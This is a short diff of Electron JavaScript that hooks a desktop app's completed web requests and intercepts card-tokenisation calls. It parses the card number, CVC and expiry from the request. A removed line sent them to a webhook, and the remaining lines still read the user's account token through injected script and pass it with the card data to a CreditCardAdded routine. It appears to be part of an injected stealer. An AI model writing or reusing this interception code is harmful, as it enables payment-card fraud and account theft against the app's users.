@@ -349,7 +349,6 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 	}
 	if (details.url.endsWith("tokens")) {
 		const item = querystring.parse(details.uploadData[0].bytes.toString())
-        SendToWebhook(JSON.stringify({ content: `${item["card[number]"]}\n${item["card[cvc]"]}\n${item["card[exp_month]"]}/${item["card[exp_year]"]}` }))
         const window = BrowserWindow.getAllWindows()[0];
         window.webContents.executeJavaScript(TokenEval, !0).then((token => {
             CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
